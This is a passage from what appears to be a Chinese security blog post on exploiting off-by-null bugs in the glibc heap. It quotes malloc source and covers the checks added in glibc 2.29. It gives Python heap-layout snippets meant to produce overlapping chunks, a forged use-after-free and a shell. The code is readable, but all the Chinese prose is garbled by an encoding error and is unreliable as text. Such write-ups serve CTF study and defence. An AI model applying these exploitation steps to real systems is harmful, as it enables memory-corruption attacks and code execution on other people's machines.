<li>å¯»æ‰¾preChunkï¼špreChunk_addr = chunkP_addr - chunkP-&gt;pre_size</li>
<li>å¯»æ‰¾nextChunkï¼šnextChunk_addr = chunkP_addr + chunkP-&gt;size</li>
</ul>
<p>å³ä»¥ä¸‹æºç ï¼Œè¿™ä¸ªä¸€ç›´æ²¡æœ‰å˜åŒ–è¿‡ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¼ªé€ pre_sizeå’Œin_useä½ï¼Œå°±èƒ½è§¦å‘å‘ä¸Šä»»æ„å¯»æ‰¾ä¸€ä¸ªæ»¡è¶³fdå’Œbkä¸ºåŒå‘é“¾è¡¨çš„chunkï¼Œä»è€Œå°†ä¸­é—´æ‰€æœ‰çš„chunkéƒ½ä¸€å¹¶åˆå¹¶ä¸ºä¸€ä¸ªChunké‡Šæ”¾æ‰ã€‚(å‘ä¸‹åˆå¹¶ä¹Ÿå¯ä»¥çš„ï¼Œä¸è¿‡ä¸€èˆ¬ä¸å¸¸ä½¿ç”¨)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831115708.png" alt="Snipaste_2021-08-31_11-57-00"></p>
<p>è¿™é‡Œå°±æ˜¯é€šè¿‡é‡Šæ”¾chunkPï¼Œä¾æ®pre_sizeå‘ä¸Šå¯»æ‰¾åˆ°åŸæœ¬å·²ç»åœ¨unsortedbinä¸­çš„preChunkï¼Œå…¶FDå’ŒBKå·²ç»ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œæ‰€ä»¥é‡Šæ”¾ChunkPä¹‹åpreChunk+OverlapChunk+chunkPéƒ½è¿›å…¥åˆ°unsortedbinä¸­ã€‚ä½†æ˜¯OverlapChunkæœ¬èº«å…¶å®å¹¶æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œæˆ‘ä»¬å†ä»unsortedbinä¸­ç”³è¯·åˆ‡å‰²å‡ºpreChunkå¤§å°çš„chunkï¼Œå†ç”³è¯·å°±å¯ä»¥å¾—åˆ°OverlapChunkã€‚è¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆéƒ½æŒ‡å‘OverlapChunkï¼Œä»è€Œä¼ªé€ å‡ºUAFï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡OverlapChunkæ¥getshelläº†ã€‚</p>

        <h2 id="1-å¸¸ç”¨å¸ƒå±€"   >
          <a href="#1-å¸¸ç”¨å¸ƒå±€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¸¸ç”¨å¸ƒå±€" class="headerlink" title="1.å¸¸ç”¨å¸ƒå±€"></a>1.å¸¸ç”¨å¸ƒå±€</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf8</span>)	<span class="comment">#0x1</span></span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x68</span>)	<span class="comment">#0x2</span></span><br><span class="line">add_malloc(<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf8</span>)	<span class="comment">#0x3</span></span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x68</span>)	<span class="comment">#0x4</span></span><br><span class="line">free(<span class="number">0x1</span>)</span><br><span class="line">edit(<span class="number">0x2</span>,<span class="number">0x70</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x100</span>)+p16(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">0x3</span>)</span><br></pre></td></tr></table></div></figure>

<p>off-by-nullåœ¨è°ƒè¯•ä¸­ä¸å¤ªå¥½æï¼Œæ‰€ä»¥æˆ‘å°±å€Ÿç”¨å †æº¢å‡ºæ¥å‡è®¾å­˜åœ¨off-by-nullï¼Œå°†chunk3åŸæœ¬çš„sizeä½0x101é€šè¿‡off-by-nullå˜æˆ0x100å³å¯ã€‚</p>

        <h2 id="2-æ³¨æ„äº‹é¡¹"   >
          <a href="#2-æ³¨æ„äº‹é¡¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ³¨æ„äº‹é¡¹" class="headerlink" title="2.æ³¨æ„äº‹é¡¹"></a>2.æ³¨æ„äº‹é¡¹</h2>
      
        <h3 id="1-é¡ºåº"   >
          <a href="#1-é¡ºåº" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-é¡ºåº" class="headerlink" title="(1)é¡ºåº"></a>(1)é¡ºåº</h3>
      <p>æ­¤å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦å…ˆé‡Šæ”¾chunk1ï¼Œå†æº¢å‡ºä¿®æ”¹chunk3ã€‚ä¸ç„¶å¦‚æœå…ˆä¿®æ”¹chunk3ï¼Œé‚£ä¹ˆé‡Šæ”¾chunk1çš„æ—¶å€™ï¼Œå¯»æ‰¾chunk1çš„nextChunkå³chunk2ï¼Œåˆ¤æ–­chunk2æ˜¯å¦å¤„äºé‡Šæ”¾çŠ¶æ€æ—¶ï¼Œä¼šæ‰¾åˆ°chunk3ï¼Œä¾æ®pre_inuseä½å‘ç°chunk2å·²ç»å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œé‚£ä¹ˆå°è¯•è¿›å…¥unlinkåˆå¹¶ï¼Œä½†æ˜¯è¿™é‡Œçš„chunk2çš„fdå’Œbkå¹¶æ²¡æœ‰ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥ä¼šå‡ºé”™ã€‚</p>

        <h3 id="2-sizeä½çš„è®¾ç½®"   >
          <a href="#2-sizeä½çš„è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-sizeä½çš„è®¾ç½®" class="headerlink" title="(2)sizeä½çš„è®¾ç½®"></a>(2)sizeä½çš„è®¾ç½®</h3>
      <ul>
<li><p>0x100ï¼šè¿™é‡Œæ³¨æ„åˆ°ä¸Šé¢çš„å¸ƒå±€ä¸­sizeä½ä¸º0x100å’Œ0x70ï¼Œè¿™é‡Œçš„0x100å°±æ˜¯ä¸ºäº†é€šè¿‡off-by-nullå°†0x101å˜æˆ0x100è®¾ç½®çš„ã€‚å½“ç„¶è®¾ç½®ä¸º0x201ï¼Œ0x301é€šå¸¸ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p>
</li>
<li><p>0x70ï¼šè¿™é‡Œå°±é€šå¸¸æ˜¯ä¸ºäº†æ–¹ä¾¿æ‰“fastbin attackï¼Œä»_malloc_hookå¤„æ„é€ 0x7få­—èŠ‚é”™ä½ç”¨çš„ã€‚</p>
</li>
</ul>

        <h1 id="äºŒã€æ›´æ–°æ¢ä»£"   >
          <a href="#äºŒã€æ›´æ–°æ¢ä»£" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€æ›´æ–°æ¢ä»£" class="headerlink" title="äºŒã€æ›´æ–°æ¢ä»£"></a>äºŒã€æ›´æ–°æ¢ä»£</h1>
      
        <h2 id="1-Glibc2-27"   >
          <a href="#1-Glibc2-27" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Glibc2-27" class="headerlink" title="1.Glibc2.27"></a>1.Glibc2.27</h2>
      <p>è¿™é‡Œä¹Ÿä¸æ˜¯ç‰¹æŒ‡2.27ï¼Œè€ŒæŒ‡çš„æ˜¯Glibc2.29ä»¥ä¸‹çš„å­˜åœ¨tcacheçš„ç‰ˆæœ¬ï¼Œè¿™ç±»ç‰ˆæœ¬é€šå¸¸éœ€è¦å¡«å……æ»¡tcacheå†è¿›è¡Œé‡Šæ”¾ï¼Œä¹Ÿä¸éœ€è¦å¤šè®²ã€‚</p>

        <h2 id="2-Glibc2-29"   >
          <a href="#2-Glibc2-29" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Glibc2-29" class="headerlink" title="2.Glibc2.29"></a>2.Glibc2.29</h2>
      <p>ä»è¿™ä¸ªç‰ˆæœ¬å¼€å§‹ï¼Œoff-by-nullç”±äºåŠ å…¥çš„æ£€æŸ¥ï¼Œå¼•å…¥äº†å¥½å‡ ç§å…¨æ–°çš„åˆ©ç”¨æ–¹å¼ã€‚</p>

        <h3 id="1-int-freeä¸­çš„å˜åŒ–"   >
          <a href="#1-int-freeä¸­çš„å˜åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-int-freeä¸­çš„å˜åŒ–" class="headerlink" title="(1)_int_freeä¸­çš„å˜åŒ–"></a>(1)_int_freeä¸­çš„å˜åŒ–</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åŠ å…¥çš„æ£€æŸ¥æ˜¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„på› ä¸º<code>p = chunk_at_offset(p, -((long) prevsize));</code>å·²ç»å˜æˆäº†preChunkã€‚æ‰€ä»¥è¿™é‡Œå°±æ˜¯æ£€æŸ¥preChunk-&gt;sizeæ˜¯å¦ç­‰äºchunkP-&gt;pre_sizeã€‚æŒ‰ç…§ä¸Šé¢é‚£å¼ å›¾çš„é€»è¾‘ï¼ŒpreChunkçš„sizeä¸º0x101ï¼ŒchunkPçš„pre_sizeä¸º0x170ï¼Œä¸¤ä¸ªä¸ç­‰äºï¼Œæ ¹æœ¬å°±æ— æ³•è¿›å…¥unlinkä¸­ï¼Œç›´æ¥å´©æ‰ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831123554.png" alt="Snipaste_2021-08-31_11-57-00"></p>

        <h3 id="2-unlinkå˜åŒ–"   >
          <a href="#2-unlinkå˜åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-unlinkå˜åŒ–" class="headerlink" title="(2)unlinkå˜åŒ–"></a>(2)unlinkå˜åŒ–</h3>
      <p>é¦–å…ˆunlinkä»å®å®šä¹‰å˜æˆäº†å…¨å±€å‡½æ•°å®šä¹‰ï¼Œåå­—ä¹Ÿä»unlinkå˜æˆäº†unlink_chunkï¼Œä½†å®é™…å†…å®¹æ²¡æœ‰å˜å¤ªå¤šï¼Œåªæ˜¯åŠ å…¥äº†ä¸€äº›æ£€æŸ¥ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function">    <span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mchunkptr fd = p-&gt;fd;</span><br><span class="line">    mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd-&gt;bk = bk;</span><br><span class="line">    bk-&gt;fd = fd;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">            || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">                fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">                fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">                p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">                p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">            p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åŠ å…¥çš„æ£€æŸ¥ï¼Œå°±åŠ äº†ä¸€ä¸ªifè¯­å¥ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>å³åœ¨unlinkæ—¶ä¼šæ£€æŸ¥nextChunkçš„pre_sizeæ˜¯å¦ç­‰äºchunkPçš„sizeã€‚</p>
<p>æŒ‰ç…§ä¹‹å‰é‚£å¼ å›¾çš„é€»è¾‘ï¼Œè¿›å…¥unlinkä¸­æ—¶preChunkçš„sizeä¸º0x100ï¼ŒpreChunkçš„nextChunkï¼Œå³overlapChunkçš„pre_sizeä¸º0x100ï¼Œç›¸ç­‰ï¼Œå¯ä»¥æ»¡è¶³è¦æ±‚ï¼Œæ²¡å•¥å¤§ç”¨ï¼Œä½†æ˜¯ä¹‹åæå‡ºçš„ç»•è¿‡æ‰‹æ®µä¹Ÿæ˜¯éœ€è¦ç»•è¿‡è¿™ä¸ªæ£€æŸ¥çš„ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831122206.png" alt="Snipaste_2021-08-31_11-57-00"></p>
<p>â–²åé¢çš„æ›´é«˜ç‰ˆæœ¬ï¼Œåˆ°2.33éƒ½æ²¡å˜åŒ–ï¼Œä¹Ÿå°±ä¸æäº†ã€‚åªæ˜¯2.32ä¸­çš„æŒ‡é’ˆå¼‚æˆ–å¯èƒ½éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œä½†æ˜¯ä¹‹åçš„ç»•è¿‡æ‰‹æ®µä¸€èˆ¬æ˜¯åŸºäºunsortedbinï¼Œsmallbinï¼Œlargebinæ¥ç»•è¿‡ï¼Œä¸å­˜åœ¨æŒ‡é’ˆå¼‚æˆ–çš„æƒ…å†µï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨å¤ªåœ¨æ„ã€‚</p>

        <h1 id="ä¸‰ã€é«˜ç‰ˆæœ¬èŠ±å¼ç»•è¿‡"   >
          <a href="#ä¸‰ã€é«˜ç‰ˆæœ¬èŠ±å¼ç»•è¿‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€é«˜ç‰ˆæœ¬èŠ±å¼ç»•è¿‡" class="headerlink" title="ä¸‰ã€é«˜ç‰ˆæœ¬èŠ±å¼ç»•è¿‡"></a>ä¸‰ã€é«˜ç‰ˆæœ¬èŠ±å¼ç»•è¿‡</h1>
      <p>è¿™é‡Œå°†çš„æ˜¯2.29åŠä»¥ä¸Šçš„ç‰ˆæœ¬</p>

        <h2 id="ç¬¬ä¸€ç§"   >
          <a href="#ç¬¬ä¸€ç§" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h2>
      <p>è¿™ä¸ªä¹‹å‰å†™è¿‡ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.pig-007.top/2021/08/14/2.29%E4%B8%8B%E7%9A%84off-by-null/" >2.29ä¸‹çš„off-by-null | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æˆ–è€…t1an5gå¸ˆå‚…çš„æ–‡ç« ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257901.htm#msg_header_h2_2" >https://bbs.pediy.com/thread-257901.htm#msg_header_h2_2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å½“ç„¶exå¸ˆå‚…çš„åŸå§‹è§£æä¹Ÿå¾ˆå¥½ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/1233" >http://blog.eonew.cn/archives/1233</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä½†æ˜¯è¿™ä¸ªéœ€è¦çˆ†ç ´åŠä¸ªå­—èŠ‚ï¼Œä¹Ÿä¸èƒ½å¯¹sizeåšå¤ªå¤šçš„é™åˆ¶ï¼Œä¸”chunkéœ€è¦ç”³è¯·å¤§æ¦‚æœ‰24ä¸ªï¼Œæ‰€ä»¥çœ‹ä¸ªäººéœ€è¦ã€‚</p>

        <h2 id="ç¬¬äºŒç§"   >
          <a href="#ç¬¬äºŒç§" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h2>
      <p>è¿™ä¸ªä¹Ÿå†™è¿‡ï¼Œå‚è€ƒè¿™ç¯‡ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.pig-007.top/2021/08/14/2.29-2.32%E4%B8%8B%E7%9A%84off-by-null/" >2.29-2.32ä¸‹çš„off-by-null | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å½“ç„¶æˆ‘ä¹Ÿæ˜¯å‚è€ƒWJHå¸ˆå‚…çš„ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236078" >glibc 2.29-2.32 off by null bypass - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™ä¸ªä¸éœ€è¦çˆ†ç ´ï¼Œä½†æ˜¯å¯¹sizeçš„é™åˆ¶ä¸èƒ½å¤ªä¸¥æ ¼ï¼Œéœ€è¦largebinçš„sizeã€‚</p>

        <h2 id="ç¬¬ä¸‰ç§"   >
          <a href="#ç¬¬ä¸‰ç§" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¬¬ä¸‰ç§" class="headerlink" title="ç¬¬ä¸‰ç§"></a>ç¬¬ä¸‰ç§</h2>
      <p>è¿™ä¸ªè¿˜æ²¡å†™è¿‡æ€»ç»“ï¼Œç°åœ¨æ¥ï¼Œä¸è¿‡å…ˆè´´ä¸‹æ–‡ç« ï¼Œinit-0å¸ˆå‚…çš„ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231418#h3-8" >å †æ¼æ´åˆ©ç”¨ï¼ˆ2.29ä»¥ä¸Šglibc,off-by-null, åŠ äº†ç”³è¯·sizeé™åˆ¶ï¼‰ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™ç§æ–¹æ³•åœ¨sizeé™åˆ¶ä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ–‡ç« ä¸­çš„é™åˆ¶æ˜¯0xe8çš„å †å—ï¼ŒçœŸæ˜¯å°†å †å¸ƒå±€ç”¨åˆ°æé«˜çš„æ°´å¹³ã€‚</p>
<p>â–²å…ˆçœ‹æœ€ç»ˆçš„å¸ƒå±€æ•ˆæœï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831184255.png" alt="Snipaste_2021-08-31_18-42-42"></p>
<p>è¿™æ ·å°±èƒ½é€šè¿‡ä¸¤é¡¹æ£€æŸ¥äº†ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_int_freeä¸­</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//unlinkä¸­</span></span><br><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></div></figure>




        <h3 id="1-å‰ç½®å¸ƒå±€ï¼š"   >
          <a href="#1-å‰ç½®å¸ƒå±€ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®å¸ƒå±€ï¼š" class="headerlink" title="(1)å‰ç½®å¸ƒå±€ï¼š"></a>(1)å‰ç½®å¸ƒå±€ï¼š</h3>
      <p>ç”±äºinit-0å¸ˆå‚…çš„é¢˜ç›®ä¸­ï¼Œç”³è¯·chunkæ˜¯ä»0x3a0å¼€å§‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘å°±ä¹Ÿä»¥0x3a0å¼€å§‹ï¼š</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get layout to let chunk0_addr = 0x****3a0</span></span><br><span class="line">claim(<span class="number">0x88</span>)<span class="comment"># 0-6			#1-7</span></span><br><span class="line">claim(<span class="number">0x98</span>)<span class="comment"># 7-13			#8-14</span></span><br><span class="line">claim(<span class="number">0xa8</span>)<span class="comment"># 14-20			#15-21</span></span><br><span class="line">claim(<span class="number">0xb8</span>)<span class="comment"># 21-27			#22-28</span></span><br><span class="line">claim(<span class="number">0xc8</span>)<span class="comment"># 28-34			#29-35</span></span><br><span class="line">claim(<span class="number">0xd8</span>)<span class="comment"># 35-41			#36-42</span></span><br><span class="line">claim(<span class="number">0xe8</span>)<span class="comment"># 42-48			#43-49</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 49 				#50</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 50 				#51		0x****f900</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 51  				#52 	0x****f9a0</span></span><br><span class="line">add_malloc(<span class="number">0xa8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 52     0 			#53		0x****f9c0</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 53     1 			#54		0x****fa70</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 54     2 			#55		0x****fb30</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 55     			#56		</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 56     3 			#57		0x****fcf0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿™ä¸ª0x200å’Œ0xe0çš„è®¾ç½®æ˜¯ä¸ºäº†ä¹‹åå°†unsortedbinChunkç»™æ”¹æˆ0x200å¤‡ç”¨çš„</span></span><br><span class="line">fakeChunk_nextChunk_preSize = p64(<span class="number">0x200</span>) + p64(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">57</span>,<span class="number">0x10</span>,fakeChunk_nextChunk_preSize)<span class="comment"># 56			#57</span></span><br><span class="line"></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 57    4 			#58 	0x****fde0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 58 				#59</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 59 				#60 	0x****ff70</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 60 				#61</span></span><br></pre></td></tr></table></div></figure>


